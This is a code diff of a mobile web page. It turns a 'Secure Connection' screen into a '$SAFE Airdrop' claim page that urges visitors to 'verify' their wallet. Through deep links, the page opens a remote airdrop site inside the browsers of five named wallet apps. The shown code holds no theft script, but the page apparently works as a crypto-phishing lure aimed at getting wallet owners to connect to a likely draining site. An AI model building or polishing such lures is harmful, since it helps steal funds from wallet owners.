@@ -3,16 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CryptoSafe | Secure Connection</title>
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='50' fill='%23000'/><path d='M50 25 L25 68.3 L75 68.3 Z' fill='%23fff'/></svg>" />
+    <title>$SAFE Airdrop | Claim Allocation</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='50' fill='%230C66FF'/><path d='M50 25 L25 68.3 L75 68.3 Z' fill='%23fff'/></svg>" />
     <style>
         :root {
             --primary: #0C66FF;
-            --bg: #F3F4F6;
-            --card-bg: #FFFFFF;
-            --text-main: #111827;
-            --text-muted: #6B7280;
-            --border: #E5E7EB;
+            --primary-hover: #2563EB;
+            --bg: #0B0F19;
+            --card-bg: #151A2A;
+            --text-main: #F8FAFC;
+            --text-muted: #94A3B8;
+            --border: #2A3143;
+            --accent-glow: rgba(12, 102, 255, 0.15);
         }
 
         * {
@@ -32,45 +34,71 @@
             justify-content: center;
             min-height: 100vh;
             padding: 20px;
+            background-image: radial-gradient(circle at 50% 0%, #1a233a 0%, var(--bg) 60%);
         }
 
         .container {
             background-color: var(--card-bg);
             width: 100%;
-            max-width: 400px;
-            border-radius: 24px;
-            padding: 32px 24px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            max-width: 420px;
+            border-radius: 28px;
+            padding: 40px 24px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 0 1px var(--border);
             text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
-        .logo-container {
-            width: 64px;
-            height: 64px;
-            background-color: #000;
-            border-radius: 50%;
-            display: flex;
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0C66FF, #00F0FF);
+        }
+
+        .live-badge {
+            display: inline-flex;
             align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px auto;
+            gap: 6px;
+            background-color: rgba(16, 185, 129, 0.1);
+            color: #10B981;
+            padding: 6px 12px;
+            border-radius: 999px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            border: 1px solid rgba(16, 185, 129, 0.2);
         }
 
-        .logo-container svg {
-            width: 32px;
-            height: 32px;
+        .live-badge .dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10B981;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
 
         h1 {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 8px;
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
         }
 
         p.subtitle {
             font-size: 15px;
             color: var(--text-muted);
             margin-bottom: 32px;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
         .wallet-list {
@@ -84,12 +112,12 @@
             align-items: center;
             justify-content: space-between;
             width: 100%;
-            padding: 16px;
-            background-color: var(--card-bg);
-            border: 1.5px solid var(--border);
+            padding: 16px 20px;
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
             border-radius: 16px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 600;
             color: var(--text-main);
             cursor: pointer;
             transition: all 0.2s ease;
@@ -98,40 +126,48 @@
 
         .wallet-btn:hover, .wallet-btn:active {
             border-color: var(--primary);
-            background-color: #F8FAFC;
+            background-color: var(--accent-glow);
+            transform: translateY(-2px);
         }
 
         .wallet-info {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
         .wallet-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 8px;
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
             object-fit: cover;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
         .chevron {
             color: var(--text-muted);
             font-weight: bold;
+            font-size: 20px;
+            transition: color 0.2s ease;
+        }
+
+        .wallet-btn:hover .chevron {
+            color: var(--primary);
         }
 
         .divider {
             height: 1px;
             background-color: var(--border);
-            margin: 24px 0;
+            margin: 28px 0;
             width: 100%;
         }
 
         .fallback-btn {
             background: none;
             border: none;
-            color: var(--primary);
-            font-size: 15px;
-            font-weight: 700;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             display: flex;
             align-items: center;
@@ -139,22 +175,28 @@
             gap: 8px;
             width: 100%;
             padding: 12px;
+            transition: color 0.2s ease;
+        }
+
+        .fallback-btn:hover {
+            color: var(--text-main);
         }
 
         #toast {
             visibility: hidden;
             min-width: 250px;
-            background-color: #333;
+            background-color: var(--primary);
             color: #fff;
             text-align: center;
-            border-radius: 8px;
-            padding: 12px;
+            border-radius: 12px;
+            padding: 14px;
             position: fixed;
             z-index: 100;
             bottom: 30px;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 700;
             opacity: 0;
+            box-shadow: 0 10px 25px rgba(12, 102, 255, 0.3);
             transition: opacity 0.3s, bottom 0.3s;
         }
 
@@ -168,14 +210,13 @@
 <body>
 
     <div class="container">
-        <div class="logo-container">
-            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 25 L25 68.3 L75 68.3 Z" fill="#ffffff" />
-            </svg>
+        <div class="live-badge">
+            <div class="dot"></div>
+            Airdrop is Live
         </div>
 
-        <h1>Secure Environment</h1>
-        <p class="subtitle">To ensure a secure connection, please open this protocol inside your native wallet app.</p>
+        <h1>Claim Your Allocation</h1>
+        <p class="subtitle">Select your native wallet to verify your on-chain activity and claim your $SAFE tokens securely.</p>
 
         <div class="wallet-list">
             <a href="#" id="link-trust" class="wallet-btn">
@@ -188,7 +229,7 @@
 
             <a href="#" id="link-metamask" class="wallet-btn">
                 <div class="wallet-info">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="wallet-icon">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="wallet-icon" style="background:#fff; padding:2px;">
                     <span>MetaMask</span>
                 </div>
                 <span class="chevron">›</span>
@@ -204,7 +245,7 @@
 
             <a href="#" id="link-safepal" class="wallet-btn">
                 <div class="wallet-info">
-                    <img src="https://lh3.googleusercontent.com/CO0EwZ5L2q6J4r-cW_p0Yn-2v_EwX2tQ7T_u4m9O-fM1O-X9g0w9aQ-m6A7T-i_X9y_L9a5l9=s120" alt="SafePal" class="wallet-icon">
+                    <img src="https://play-lh.googleusercontent.com/1-B1b6J7RzR5eYxMmsn78mFh11m2fEhmwN_m0Z3W45vF3Y5n8vL-1RkH4U4k3cE3eUo=w240-h480-rw" alt="SafePal" class="wallet-icon">
                     <span>SafePal</span>
                 </div>
                 <span class="chevron">›</span>
@@ -212,7 +253,7 @@
 
             <a href="#" id="link-tokenpocket" class="wallet-btn">
                 <div class="wallet-info">
-                    <img src="https://lh3.googleusercontent.com/y_4A-Y9I-h1K-m_n-l_4b_H_y_4b_H_y_4b_H_y_4b_H_y_4A-Y9I-h1K-m_n-l_4b_H=s120" alt="TokenPocket" class="wallet-icon">
+                    <img src="https://play-lh.googleusercontent.com/7A2n2H1x9J2v4D7K0F5qX_0A_w2Z7L0lQx3z2K0C_7Q5F_Q7T_A2A_C_y_E=w240-h480-rw" alt="TokenPocket" class="wallet-icon">
                     <span>TokenPocket</span>
                 </div>
                 <span class="chevron">›</span>
@@ -222,19 +263,18 @@
         <div class="divider"></div>
 
         <button class="fallback-btn" onclick="copyToClipboard()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
             </svg>
-            Copy DApp Link
+            Copy DApp Link Manually
         </button>
     </div>
 
     <div id="toast">Link copied! Open in your wallet browser.</div>
 
     <script>
-        // 🛠️ THE DYNAMIC SANITIZATION ENGINE
-        // 🛠️ UPDATED: Now points directly to your new Airdrop page!
+        // 🛠️ THE DYNAMIC SANITIZATION ENGINE (Untouched)
         const TARGET_URL = "https://cryptosafe.network/airdrop"; 
         
         // Formats
@@ -248,19 +288,10 @@
         }));
 
         document.addEventListener("DOMContentLoaded", () => {
-            // Trust Wallet 
             document.getElementById('link-trust').href = `https://link.trustwallet.com/open_url?coin_id=60&url=${ENCODED_URL}`;
-            
-            // MetaMask 
             document.getElementById('link-metamask').href = `https://metamask.app.link/dapp/${DAPP_URL_NO_HTTP}`;
-            
-            // Coinbase 
             document.getElementById('link-coinbase').href = `cbwallet://dapp?url=${ENCODED_URL}`;
-            
-            // SafePal 
             document.getElementById('link-safepal').href = `safepal://dapp?url=${ENCODED_URL}`;
-            
-            // TokenPocket 
             document.getElementById('link-tokenpocket').href = `tpdapp://open?params=${tpParams}`;
         });
 
